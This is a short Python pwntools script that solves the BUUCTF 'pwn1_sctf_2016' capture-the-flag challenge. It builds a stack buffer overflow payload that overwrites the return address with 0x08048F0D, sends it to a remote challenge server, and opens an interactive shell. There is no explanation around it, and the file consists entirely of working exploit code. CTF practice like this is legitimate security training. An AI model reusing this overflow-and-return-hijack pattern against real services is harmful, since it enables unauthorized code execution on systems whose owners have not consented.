from pwn import *

path="/mnt/e/S/CTF/BUUCTF/PWN/pwn1_sctf_2016"

#payload=b'a'*(128+8)+p64(0x00400596)
payload = b'I'*20+b'a'*4+p32(0x08048F0D)
#sh=process(path)
sh=remote('node4.buuoj.cn',27159)

#sh.recvuntil(b">")

sh.sendline(payload)

sh.interactive()